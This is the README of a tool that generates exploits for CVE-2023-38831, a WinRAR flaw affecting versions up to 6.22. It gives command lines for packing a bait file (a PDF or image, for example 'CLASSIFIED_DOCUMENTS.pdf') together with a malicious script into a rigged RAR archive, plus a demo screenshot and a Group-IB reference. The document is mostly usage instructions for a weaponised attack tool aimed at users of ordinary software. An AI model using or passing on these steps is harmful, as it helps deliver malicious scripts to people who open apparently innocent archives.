
# CVE-2023-38831 winrar exploit generator

## Quick poc test

Generate the default poc for test

```
python cve-2023-38831-exp-gen.py poc
or
python cve-2023-38831-exp-gen.py CLASSIFIED_DOCUMENTS.pdf script.bat  poc.rar
```

## Custom

1. Place the bait file and (evil) script file in the current directory, the bait file is recommended to be an image (.png, jpg) or a document (.pdf)
2. Run `python cve-2023-38831-exp-gen.py <bait name> <script name> <output name>` to generate your exploit


## Screenshots

Infected version: winrar <= 6.22

![demo](./demo.png)



## Reference

https://www.group-ib.com/blog/cve-2023-38831-winrar-zero-day/
